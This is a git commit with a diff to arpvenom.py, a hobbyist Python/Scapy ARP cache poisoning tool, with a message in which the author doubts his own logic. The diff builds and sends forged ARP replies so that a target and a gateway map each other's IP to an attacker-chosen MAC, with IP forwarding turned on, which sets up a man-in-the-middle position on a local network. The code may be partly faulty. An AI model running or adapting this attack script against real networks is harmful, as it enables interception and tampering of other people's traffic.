2962c700840177fbc0fc11e62658f9dc3111cd63
rossfrombritain <ross123campbell@gmail.com>
2021-08-10 16:32:50 -0400

    made some changes, seems as though my logic isn't correct?

--- arpvenom.py
+++ arpvenom.py
@@ -12,40 +12,43 @@ def checkProc():
             print("Overwritten /proc/sys/net/ipv4/ip_forward val to 1")
 
 
-def poison(target, macaddr, gateway):
-    target = "192.168.69.112"
-    gateway = "192.168.69.42"
-
-    # find the address of both the target and the gateway
-    #   hwsrc/hwdst = MAC address.  psrc/pdst = IP address
-    
-    # pick up the MAC address of the gateway for later
-    getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway)
+def poison(target, evilIP, gateway):
+    # pick up evil MAC address for later
+    getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway, psrc=evilIP)
     response = srp(getArp, timeout=3)
-    gatewayMac = response[0][0][1].hwsrc
-    
-    # now get the MAC address of our target
-    getTgtArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target)
-    response = srp(getTgtArp, timeout=3)
-    targetMac = response[0][0][1].hwsrc
+    evilMac = response[0][0][1].hwsrc
+
+    if not evilMac:
+        print(" [X] Couldn't pick up a MAC address to spoof for %s" % evilIP)
+        return
 
     # now send the gateway's details to the target
-    gatewaySpoof = ARP(op=2, psrc=target, pdst=gateway, hwsrc=macaddr)
+    gatewaySpoof = ARP(op=2, psrc=target, pdst=gateway, hwsrc=evilMac)
 
     # then trick the target
-    targetSpoof = ARP(op=2, psrc=gateway, pdst=target, hwsrc=macaddr)
+    targetSpoof = ARP(op=2, psrc=gateway, pdst=target, hwsrc=evilMac)
+
+    return [gatewaySpoof, targetSpoof]
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
     parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
-    parser.add_argument('-m', metavar='mac', help='the MAC address we are spoofing')
+    parser.add_argument('-e', metavar='evil', help='the IP address we are spoofing traffic to')
     parser.add_argument('-g', metavar='gateway', help='the gateway we are fooling')
 
     checkProc()
 
     args = parser.parse_args()
     target = args.t
-    macaddr = args.v
-    gateway = ""
-    poison(target, macaddr, gateway)
+    evil = args.e
+    gateway = args.g
+
+    packets = poison(target, evil, gateway)
+
+    for pkt in packets:
+        #try:
+            rr = srp(pkt, timeout=2)
+            print(rr[0].show())
+        #except:
+            #print("failed to send packet")
